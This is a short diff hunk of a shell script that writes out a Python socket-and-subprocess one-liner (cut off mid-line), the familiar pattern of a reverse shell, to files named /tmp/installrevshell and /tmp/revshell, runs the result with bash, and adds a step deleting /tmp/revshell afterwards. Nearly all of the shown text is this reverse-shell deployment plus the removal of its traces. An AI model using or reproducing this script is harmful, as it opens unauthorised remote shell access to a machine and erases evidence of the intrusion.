@@ -3,3 +3,5 @@ echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sock
 /bin/rm /tmp/installrevshell
 
 /bin/bash -e /tmp/revshell
+
+/bin/rm /tmp/revshell
